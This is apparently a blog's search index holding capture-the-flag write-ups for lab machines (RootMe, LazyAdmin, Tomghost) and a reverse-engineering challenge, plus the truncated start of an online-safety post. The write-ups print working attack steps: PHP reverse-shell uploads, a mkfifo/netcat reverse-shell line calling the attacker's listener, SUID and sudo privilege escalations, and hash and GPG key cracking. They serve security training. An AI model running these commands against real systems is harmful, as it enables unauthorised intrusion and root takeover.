[ { "title": "Rootme", "url": "/posts/RootMe/", "categories": "Tryhackme, Easy", "tags": "nmap, enumeration, gobuster, gtfobins, netcat", "date": "2023-06-01 00:00:00 +0300", "snippet": " Rootme is a fairly simple linux box. We shall start with nmap scan to see the ports open on the machine. We would then use gobuster for directory brute force and from there we would find where yo...", "content": " Rootme is a fairly simple linux box. We shall start with nmap scan to see the ports open on the machine. We would then use gobuster for directory brute force and from there we would find where you can upload a file. So we shall upload a reverse shell script which will give us the initial access on the system. Finally we shall do privilege escalation by exploiting the SUID of one of the files to get root privileges.EnumerationWe will begin with port scanning to know which ports are open. We shall use nmap . We have used -sC for default scripts, -sV to enumerate all versions, -oA to output all format in a file called initial and finally it’s IP address. Here is the results:└─$ nmap -sC -sV -oA initial 10.10.151.224 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 11:31 EATNmap scan report for 10.10.151.224Host is up (0.23s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)| 256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)|_ 256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-title: HackIT - Home|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 57.88 secondsWell Port 80 is open so we shall use gobuster for directory brute force and here is it’s results:└─$ gobuster dir -u http://10.10.151.224/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt===============================================================Gobuster v3.3by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.151.224/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.3[+] Timeout: 10s===============================================================2023/06/01 11:30:55 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 278]/.htaccess (Status: 403) [Size: 278]/.htpasswd (Status: 403) [Size: 278]/css (Status: 301) [Size: 312] [--&gt; http://10.10.151.224/css/]/index.php (Status: 200) [Size: 616]/js (Status: 301) [Size: 311] [--&gt; http://10.10.151.224/js/]/panel (Status: 301) [Size: 314] [--&gt; http://10.10.151.224/panel/]/server-status (Status: 403) [Size: 278]/uploads (Status: 301) [Size: 316] [--&gt; http://10.10.151.224/uploads/]Progress: 4713 / 4714 (99.98%)===============================================================2023/06/01 11:33:20 Finished===============================================================Well, we have a directory called /panel and if we go there we would see that we can upload some file. Since the website is running on php we need to find a php exploit that will give us a reverse shell.panelInitial accessWe used the same exploit that was previously used on the LazyAdmin challenge to gain initial access. Change the IP and the Port that netcat will be listening from. The exploit can be found at the following GitHub repository: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php.$ whoamiwww-data$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$Well we have gotten shell and we are www-data . So we need to upgrade our shell so that we have a stable shell.$ python -c 'import pty;pty.spawn(\"/bin/bash\")'bash-4.4$ ^Zzsh: suspended nc -lvnp 9001Press Ctrl + z to background the session then:└─$ stty raw -echo; fg[1] + continued nc -lvnp 9001bash-4.4$ export TERM=xtermbash-4.4$Privilege EscalationAfter gaining access as www-data, we need to escalate our privileges to gain root access. We can start by searching for files with the SUID bit set using the following command:find / -perm /4000 2&gt;/dev/nullThis will show us all the files with the SUID bit set. We can then use GTFOBins to find ways to exploit these files. In this case, Python was not set correctly and we can exploit it by using this from gtfobins:/usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'Once we have a root shell, we can navigate to the /root directory and read the root.txt file to get the flag.# cd /root# lsroot.txt# cat root.txtTHM{changed_the_flag}# Yeah that’s it… We have successfully hacked into rootme machine and if you have any questions regarding the box you can ask on the comment section. HAPPY HACKING CHEERS ;)" }, { "title": "LazyAdmin", "url": "/posts/LazyAdmin/", "categories": "Tryhackme, Easy", "tags": "nmap, enumeration, gobuster", "date": "2023-05-11 00:00:00 +0300", "snippet": " Lazyadmin is an easy rated box on Tryhackme. On this box we will begin with nmap scan to enumerate various ports. We shall then exploit a well known vulnerability on the box to get initial footho...", "content": " Lazyadmin is an easy rated box on Tryhackme. On this box we will begin with nmap scan to enumerate various ports. We shall then exploit a well known vulnerability on the box to get initial foothold and finally do privilege escalation through a script running on the box and it is owned by root. (My IP would vary because I restarted the lab)EnumerationWe begin with port scanning where by we will use nmap . We have used -sC for default script -sV to enumerate the version -oA to out put format to a file called initial and the box IP and it’s results is here.└─$ nmap -sC -sV -oA initial 10.10.249.217Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 11:22 EATNmap scan report for 10.10.249.217Host is up (0.19s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 497cf741104373da2ce6389586f8e0f0 (RSA)| 256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)|_ 256 61846227c6c32917dd27459e29cb905e (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 54.39 secondsSince port 80 is open we shall use gobuster to enumerate the directories on the website and we get /content . Well let’s navigate there http://&lt;IP&gt;/content/ . Nice we see a CMS (content management system) called SweetRice (Remember this because we will research more on this CMS).─$ gobuster dir -u http://10.10.249.217/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt ===============================================================Gobuster v3.3by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.249.217/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.3[+] Timeout: 10s===============================================================2023/05/10 11:26:24 Starting gobuster in directory enumeration mode===============================================================/.htaccess (Status: 403) [Size: 278]/.hta (Status: 403) [Size: 278]/.htpasswd (Status: 403) [Size: 278]/content (Status: 301) [Size: 316] [--&gt; http://10.10.249.217/content/]/index.html (Status: 200) [Size: 11321]/server-status (Status: 403) [Size: 278]Progress: 4707 / 4714 (99.85%)===============================================================2023/05/10 11:28:12 Finished===============================================================contentI searched if I can find anything on the comment section but I couldn’t find. So I decide to use gobuster again to brute-force and see if I can enumerate other directories on the content .└─$ gobuster dir -u http://10.10.249.217/content/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt===============================================================Gobuster v3.3by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.249.217/content/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.3[+] Timeout: 10s===============================================================2023/05/10 11:38:58 Starting gobuster in directory enumeration mode===============================================================/.htpasswd (Status: 403) [Size: 278]/.htaccess (Status: 403) [Size: 278]/.hta (Status: 403) [Size: 278]/_themes (Status: 301) [Size: 324] [--&gt; http://10.10.249.217/content/_themes/]/as (Status: 301) [Size: 319] [--&gt; http://10.10.249.217/content/as/]/attachment (Status: 301) [Size: 327] [--&gt; http://10.10.249.217/content/attachment/]/images (Status: 301) [Size: 323] [--&gt; http://10.10.249.217/content/images/]/inc (Status: 301) [Size: 320] [--&gt; http://10.10.249.217/content/inc/]/index.php (Status: 200) [Size: 2199]/js (Status: 301) [Size: 319] [--&gt; http://10.10.249.217/content/js/]Progress: 4712 / 4714 (99.96%)===============================================================2023/05/10 11:40:45 Finished===============================================================Nice. We have a bunch of directories we need to check them.If we go to /as we find login page. So where would we find the login credentials? Well that’s the same question I asked myself. That aside… Lets continue with the enumeration.loginI decided to do some research on SweetRice . We shall begin searching it on searchsploit before going to the internet. Here is the result we get:└─$ searchsploit SweetRice------------------------------------------------------------------------ --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------SweetRice 0.5.3 - Remote File Inclusion | php/webapps/10246.txtSweetRice 0.6.7 - Multiple Vulnerabilities | php/webapps/15413.txtSweetRice 1.5.1 - Arbitrary File Download | php/webapps/40698.pySweetRice 1.5.1 - Arbitrary File Upload | php/webapps/40716.pySweetRice 1.5.1 - Backup Disclosure | php/webapps/40718.txtSweetRice 1.5.1 - Cross-Site Request Forgery | php/webapps/40692.htmlSweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution | php/webapps/40700.htmlSweetRice &lt; 0.6.4 - 'FCKeditor' Arbitrary File Upload | php/webapps/14184.txt------------------------------------------------------------------------ ---------------------------------Shellcodes: No ResultsWell, SweetRice have several vulnerabilities associated with it. We shall start with Backup Disclosure to see if we can have something useful on its backup.If you cat out the php/webapps/40718.txt we can see the where the backup is stored.└─$ cat /usr/share/exploitdb/exploits/php/webapps/40718.txtTitle: SweetRice 1.5.1 - Backup DisclosureApplication: SweetRiceVersions Affected: 1.5.1Vendor URL: http://www.basic-cms.org/Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zipDiscovered by: Ashiyane Digital Security TeamTested on: Windows 10Bugs: Backup DisclosureDate: 16-Sept-2016Proof of Concept :You can access to all mysql backup and download them from this directory.http://localhost/inc/mysql_backupand can access to website files backup from:http://localhost/SweetRice-transfer.zipWe shall navigate to http://10.10.249.217/content/inc/mysql_backup and we would find the backup. Download the backup from there then we have a look at it.backup14 =&gt; 'INSERT INTO `%--%_options` VALUES(\\'1\\',\\'global_setting\\',\\'a:17:{s:4:\\\\\"name\\\\\";s:25:\\\\\"Lazy Admin&amp;#039;s Website\\\\\";s:6:\\\\\"author\\\\\";s:10:\\\\\"Lazy Admin\\\\\";s:5:\\\\\"title\\\\\";s:0:\\\\\"\\\\\";s:8:\\\\\"keywords\\\\\";s:8:\\\\\"Keywords\\\\\";s:11:\\\\\"description\\\\\";s:11:\\\\\"Description\\\\\";s:5:\\\\\"admin\\\\\";s:7:\\\\\"manager\\\\\";s:6:\\\\\"passwd\\\\\";s:32:\\\\\"42f749ade7f9e195bf475f37a44cafcb\\\\\";s:5:\\\\\"close\\\\\";i:1;s:9:\\\\\"close_tip\\\\\";s:454:\\\\\"&lt;p&gt;Welcome to SweetRice - Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is building now , please come late.&lt;/h1&gt;&lt;p&gt;If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting &lt;/p&gt;&lt;p&gt;and uncheck the checkbox \\\\\"Site close\\\\\" to open your website.&lt;/p&gt;&lt;p&gt;More help at &lt;a href=\\\\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\\\\"&gt;Tip for Basic CMS SweetRice installed&lt;/a&gt;&lt;/p&gt;\\\\\";s:5:\\\\\"cache\\\\\";i:0;s:13:\\\\\"cache_expired\\\\\";i:0;s:10:\\\\\"user_track\\\\\";i:0;s:11:\\\\\"url_rewrite\\\\\";i:0;s:4:\\\\\"logo\\\\\";s:0:\\\\\"\\\\\";s:5:\\\\\"theme\\\\\";s:0:\\\\\"\\\\\";s:4:\\\\\"lang\\\\\";s:9:\\\\\"en-us.php\\\\\";s:11:\\\\\"admin_email\\\\\";N;}\\',\\'1575023409\\');',We see it has hard coded username of manager and hash password 42f749ade7f9e195bf475f37a44cafcb If we go to crackstation.net we find its password which is Password123crackstation.netSo I decided to tried to exploit the file upload vulnerability which we know it is vulnerable to it. I found this python exploit from exploit-db https://www.exploit-db.com/exploits/40716 . The challenge I faced was alot of this php exploits was not working till I found this from github https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php so change where necessary i.e IP and PortInitial footholdWe shall run the python script and fill in the necessary details…Enter The Target URL(Example : localhost.com) : 10.10.205.80/contentEnter Username : managerEnter Password : Password123Enter FileName (Example:.htaccess,shell.php5,index.html) : revshelll.php5[+] Sending User&amp;Pass...[+] Login Succssfully...[+] File Uploaded...[+] URL : http://10.10.205.80/content/attachment/revshelll.php5Then we shall open a listening port waiting for connection. When we visit the Url given by the script we would have reverse shell connection.└─$ nc -lvnp 9001listening on [any] 9001 ...connect to [10.8.112.1] from (UNKNOWN) [10.10.205.80] 51296Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux 16:07:43 up 42 min, 0 users, load average: 0.00, 0.00, 0.06USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$So let us upgrade our shell by typing python -c \"import pty;pty.spawn('/bin/bash')\" then export TERM=xterm then press CTRL + z to background the shell and finally on your machine stty raw -echo; fg$ python -c \"import pty;pty.spawn('/bin/bash')\"www-data@THM-Chal:/$ export TERM=xtermwww-data@THM-Chal:/$ ^Zzsh: suspended nc -lvnp 9001stty raw -echo; fgNow we have a stable shell and we can cat out the user flagprivilege escalationWe shall start by sudo -l to see which files the user can run with root privilagewww-data@THM-Chal:/$ sudo -lMatching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.plWell we have backup.pl file. Lets check its permissions.www-data@THM-Chal:/home/itguy$ ls -la | grep backup.pl-rw-r--r-x 1 root root 47 Nov 29 2019 backup.plWe don’t have permissions to write to the file. Now we have to cat the file to see the code being ran.www-data@THM-Chal:/home/itguy$ cat backup.pl #!/usr/bin/perlsystem(\"sh\", \"/etc/copy.sh\");It is running another script called copy.sh found on the /etc directory.Lets see the permissions of /copy.shwww-data@THM-Chal:/etc$ ls -la copy.sh-rw-r--rwx 1 root root 81 Nov 29 2019 copy.shWe have write permissions on this file. So what we can do is create a payload and save it to the file where by we shall receive a revershell as root.www-data@THM-Chal:/etc$ cat copy.sh rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;/tmp/fInfact if we cat the contents of copy.sh we see a payload already there. The only thing we shall do is change the IP to ours and the port number.echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; 4444 &gt;/tmp/f\" &gt; copy.shOpen a listener on another terminal on port 4444 nc -lvnp 4444Now run the file with sudo.www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.plrm: cannot remove '/tmp/f': No such file or directory└─$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.8.112.1] from (UNKNOWN) [10.10.205.80] 56526We have root and we can go and cat out the flag in /root/root.txt and submit it. Well this was a good box and we have learnt alot of techniques especially on enumeration." }, { "title": "Tomghost", "url": "/posts/tomghost/", "categories": "Tryhackme, Easy", "tags": "nmap, metaslpoit, ssh, gpg, john, gtfobins", "date": "2023-04-20 00:00:00 +0300", "snippet": " Tomghost is a linux machine which is rated easy by TryHackMe. This machine covers vulnerability on the Tomcat apache server and privilege escalation on a different user on the box. I’ll have to r...", "content": " Tomghost is a linux machine which is rated easy by TryHackMe. This machine covers vulnerability on the Tomcat apache server and privilege escalation on a different user on the box. I’ll have to remove the flags and passwords…Network scanningThe machine IP address is 10.10.68.255 and we shall start by scanning it by using nmap.Command: nmap -sC -sV -oA initial 10.10.68.255└─$ nmap -sC -sV -oA initial 10.10.68.255 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 11:58 EATNmap scan report for 10.10.68.255Host is up (0.17s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)| 256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)|_ 256 48d1301b386cc653ea3081805d0cf105 (ED25519)53/tcp open tcpwrapped8009/tcp open ajp13 Apache Jserv (Protocol v1.3)| ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS8080/tcp open http Apache Tomcat 9.0.30|_http-favicon: Apache Tomcat|_http-title: Apache Tomcat/9.0.30Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 120.12 secondsEnumerationThere is a website running on port 8080. We notice it is Apache Tomcat version 9.0.30. If we google some of the vulnerabilities which affected that version we get File upload vulnerability CVE-2020-1938. Now lets launch Metaslpoit and search it.msf6 &gt; search CVE-2020-1938Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/http/tomcat_ghostcat 2020-02-20 normal Yes Apache Tomcat AJP File ReadInteract with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcatUse the exploit which we have found.use auxiliary/admin/http/tomcat_ghostcatThen set the RHOSTS to our machine’s IP address.msf6 auxiliary(admin/http/tomcat_ghostcat) &gt; set rhosts 10.10.68.255rhosts =&gt; 10.10.68.255Once you have set the rhosts you can now exploit the system by using run or exploitmsf6 auxiliary(admin/http/tomcat_ghostcat) &gt; run[*] Running module against 10.10.68.255Status Code: 200Accept-Ranges: bytesETag: W/\"1261-1583902632000\"Last-Modified: Wed, 11 Mar 2020 04:57:12 GMTContent-Type: application/xmlContent-Length: 1261&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.--&gt;&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\" metadata-complete=\"true\"&gt; &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt; &lt;description&gt; Welcome to GhostCat\tskyfuck:I_HAVE_REMOVED_THE_PASSWORD &lt;/description&gt;&lt;/web-app&gt;msf6 auxiliary(admin/http/tomcat_ghostcat) &gt;You will find the username and the password on the description tag. You can also find this file here: /home/{YOUR_USERNAME}/.msf4/loot/20230420121725_default_10.10.68.255_WEBINFweb.xml_167447.txtInitial FootholdSince we have the username and password we can ssh into the machine.└─$ ssh skyfuck@10.10.68.255lets cat the user flagskyfuck@ubuntu:~$ cat /home/merlin/user.txt THM{I_HAVE_REMOVED_THE_FLAG}If we go to the home directory, we find two files:skyfuck@ubuntu:~$ lscredential.pgp tryhackme.ascLets copy the files to our machine so as we can crack the credential.gpg└─$ scp skyfuck@10.10.68.255:/home/skyfuck/* .skyfuck@10.10.68.255's password: credential.pgp 100% 394 0.9KB/s 00:00 tryhackme.ascWe shall use John to crack the password meaning we have to use gpg2john so as we have it’s hash to crack it.└─$ gpg2john tryhackme.asc &gt; hashNow fire up john and let it do its thing.└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])Cost 1 (s2k-count) is 65536 for all loaded hashesCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashesCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusI_HAVE_REMOVED_THE_PASSWORD (tryhackme) 1g 0:00:00:00 DONE (2023-04-20 12:37) 1.923g/s 2061p/s 2061c/s 2061C/s theresa..alexandruUse the \"--show\" option to display all of the cracked passwords reliablySession completed.Nice… We have the password of the gpg file so lets first import it.skyfuck@ubuntu:~$ gpg --import tryhackme.asc gpg: key C6707170: secret key importedgpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb createdgpg: key C6707170: public key \"tryhackme &lt;stuxnet@tryhackme.com&gt;\" importedgpg: key C6707170: \"tryhackme &lt;stuxnet@tryhackme.com&gt;\" not changedgpg: Total number processed: 2gpg: imported: 1gpg: unchanged: 1gpg: secret keys read: 1gpg: secret keys imported: 1Once we have imported it we are going to decrypt the gpg.skyfuck@ubuntu:~$ gpg --decrypt credential.pgp You need a passphrase to unlock the secret key foruser: \"tryhackme &lt;stuxnet@tryhackme.com&gt;\"1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)gpg: gpg-agent is not available in this sessiongpg: WARNING: cipher algorithm CAST5 not found in recipient preferencesgpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 \"tryhackme &lt;stuxnet@tryhackme.com&gt;\"merlin:I_HAVE_REMOVED_THE_PASSWORDskyfuck@ubuntu:~$Wooah… We have found another user and the password.Privilege EscalationLets login in his account and find our way to being the root.└─$ ssh merlin@10.10.68.255merlin@10.10.68.255's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)By running sudo -l we see that the /usr/bin/zip can be ran by this user with root privilege.merlin@ubuntu:~$ sudo -lMatching Defaults entries for merlin on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser merlin may run the following commands on ubuntu: (root : root) NOPASSWD: /usr/bin/zipmerlin@ubuntu:~$So lets go to gtfobins and find our payload to use. Linkmerlin@ubuntu:~$ TF=$(mktemp -u)merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #' adding: etc/hosts (deflated 31%)# iduid=0(root) gid=0(root) groups=0(root)#We have root soo lets get our flag and get out of here.# cat /root/root.txtTHM{I_HAVE_REMOVED_THE_FLAG}# If you have any other additional information and resources you can add it at the comment section. THANKS ;)" }, { "title": "You Can't see me", "url": "/posts/you-cant-c-me/", "categories": "HackTheBox, reverse-engineering", "tags": "file, strings, ltrace, radare2, r2, reverse engineering", "date": "2023-01-08 00:00:00 +0300", "snippet": " CHALLENGE DESCRIPTION: Can you see me? Source created by: MinatoTWIn this reverse engineering challenge, we are given an ELF 64-bit LSB executable file named \"auth\" which had been stripped. The f...", "content": " CHALLENGE DESCRIPTION: Can you see me? Source created by: MinatoTWIn this reverse engineering challenge, we are given an ELF 64-bit LSB executable file named \"auth\" which had been stripped. The first step to do is to check the file format using the file command, which revealed that it is an executable file for GNU/Linux 3.2.0.Method 1ReconWe shall start by checking the file format and we notice it is an executable file which has been stripped.└─$ file auth auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, strippedNext, we shall use the strings command to search for any interesting strings within the file. However, we find nothing noteworthy in the output.└─$ strings auth /lib64/ld-linux-x86-64.so.2libc.so.6stdin.........Then we shall use the ltrace tool to see if we can get any additional information from the executable. This reveales that the password was being leaked in a string compare operation.└─$ ltrace ./auth printf(\"Welcome!\\n\"Welcome!) = 9malloc(21) = 0x206e6b0fgets(afdsf\"afdsf\\n\", 21, 0x7f8ec926aa80) = 0x206e6b0strcmp(\"wh00ps!_y0u_d1d_c_m3\", \"afdsf\\n\") = 22printf(\"I said, you can't c me!\\n\"I said, you can't c me!) = 24+++ exited (status 0) +++ExploitationNow that we have found the password on the string compare we can use it to get the flag└─$ ./authWelcome!wh00ps!_y0u_d1d_c_m3HTB{wh00ps!_y0u_d1d_c_m3}Method 2We shall use radare2 to decompile the file and analyze the binary.ReconOur first step is to analyze the file using the radare2 tool and the aaaaaa command. This provided us with detailed information about the file, including its size, format, and architecture.We will start by analyzing the file:└─$ r2 auth [0x00401070]&gt; aaaaaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Finding and parsing C++ vtables (avrr)[x] Type matching analysis for all functions (aaft)[x] Propagate noreturn information (aanr)[x] Finding function preludes[x] Enable constraint types analysis for variables[0x00401070]&gt;Then we shall use i flag to get more information about the file[0x00401070]&gt; ifd 3file authsize 0x3848humansz 14.1Kminopsz 1maxopsz 16invopsz 1mode r-xformat elf64iorw falseblock 0x100type EXEC (Executable file)arch x86baddr 0x400000binsz 12676bintype elfbits 64canary falseclass ELF64compiler GCC: (Ubuntu 9.2.1-9ubuntu2) 9.2.1 20191008 clang version 6.0.1-11 (tags/RELEASE_601/final)crypto falseendian littlehavecode trueintrp /lib64/ld-linux-x86-64.so.2laddr 0x0lang clinenum falselsyms falsemachine AMD x86-64 architecturenx trueos linuxpic falserelocs falserelro partialrpath NONEsanitize falsestatic falsestripped truesubsys linuxva true[0x00401070]&gt;Next, we shall use the iz command to search for any interesting strings within the file. However, we have find nothing noteworthy in the output.[0x00401070]&gt; iz[Strings]nth paddr vaddr len size section type string―――――――――――――――――――――――――――――――――――――――――――――――――――――――0 0x00002004 0x00402004 9 10 .rodata ascii Welcome!\\n1 0x0000200e 0x0040200e 24 25 .rodata ascii I said, you can't c me!2 0x00002027 0x00402027 8 9 .rodata ascii 3 0x00002030 0x00402030 20 21 .rodata ascii this_is_the_password4 0x00002050 0x00402050 6 7 .rodata ascii m^&amp;&amp;fi5 0x00002057 0x00402057 13 13 .rodata ascii Uo&amp;kUZ'ZUYUc)[0x00401070]&gt;We shall list all the funtions by using afl[0x00401070]&gt; afl0x00401070 1 47 entry00x00401030 1 6 sym.imp.printf0x00401040 1 6 sym.imp.fgets0x00401050 1 6 sym.imp.strcmp0x00401060 1 6 sym.imp.malloc0x00401160 7 297 main0x00401150 5 118 -&gt; 55 entry.init00x00401120 3 33 -&gt; 32 entry.fini00x004010b0 4 33 -&gt; 31 fcn.004010b00x00401000 3 27 fcn.004010000x004010a0 1 5 fcn.004010a00x00401290 4 101 fcn.004012900x00401300 1 5 fcn.004013000x00401308 1 13 fcn.00401308[0x00401070]&gt;ExploitationNow seek to main function:[0x00401070]&gt; s mainWe shall set the break point on the string compare.db 0x00401249.By running the file and hitting the break point, we were able to use the afvd command to display all local variables on the stack. This reveales the password being used in the string compare operation.[0x00401249]&gt; afvdtype:signed int64_t doesn't existvar var_4h = 0x7ffdfb61267c = (qword)0x0000000100000000var var_8h = var s1 = 0x7ffdfb612660 = \"wh00ps!_y0u_d1d_c_m3\"var var_18h = 0x7ffdfb612668 = (qword)0x5f6431645f753079var var_10h = 0x7ffdfb612670 = (qword)0x00000000336d5f63var var_ch = 0x7ffdfb612674 = (qword)0x0000001400000000var var_44h = 0x7ffdfb61263c = (qword)0x26265e6d00000009var s2 = (*0x1dbc6b0)0x7ffdfb612658 = \"asfd\\n\"var var_40h = 0x7ffdfb612640 = \"m^&amp;&amp;fi\\x17Uo&amp;kUZ'ZUYUc)\"var var_38h = 0x7ffdfb612648 = (qword)0x555a275a556b266fvar var_30h = 0x7ffdfb612650 = (qword)0x0000000029635559var var_50h = 0x7ffdfb612630 = \"\\xb0\\xc6\\xdb\\x01\"var var_58h = 0x7ffdfb612628 = (qword)0x0000000000000000var var_54h = 0x7ffdfb61262c = (qword)0x01dbc6b000000000We can see the s1 variable containing the password. Now we can re-run the program by using ood and dc command. Then we would input the password we retrieved from the s1 variable and we shall get the flag.[0x00401246]&gt; ood native-singlestep: No such processStepping failed!PTRACE_CONT: No such process(7887) Process exited with status=0x9child received signal 9File dbg:///home/yrncollo/Desktop/htb/you_cant_see_me/auth reopened in read-write mode[0x7f2542a469c0]&gt; dcWelcome!wh00ps!_y0u_d1d_c_m3hit breakpoint at: 0x401246[0x00401246]&gt; dcHTB{wh00ps!_y0u_d1d_c_m3}(7938) Process exited with status=0x0[0x7f25429051f9]&gt;We have successfully retrieved the flag: HTB{wh00ps!_y0u_d1d_c_m3}. If you have any other additional information and resources you can add it at the comment section. THANKS ;)" }, { "title": "How to stay safe online", "url": "/posts/online-safety/", "categories": "Cheat sheet", "tags": "password, data breach, fake emails, phishing, 2FA, backup, cyberbullying, cybercriminals", "date": "2023-01-01 00:00:00 +0300", "snippet": " It’s important to keep yourself safe when using the internet, especially as we start the new year. There are always new ways that hackers and cyber criminals try to get access to personal informa...", "content": " It’s important to keep yourself safe when using the internet, especially as we start the new year. There are always new ways that hackers and cyber criminals try to get access to personal information, so it’s important to take steps to protect yourself.Ensuring the safety and security of your online presence is crucial in today’s digital world. There are numerous potential threats that can pose risks to your privacy and security, so it’s important to be aware of these dangers and take steps to protect yourself. The following tips can help you stay safe while using the internet:Password ManagementHow to create a 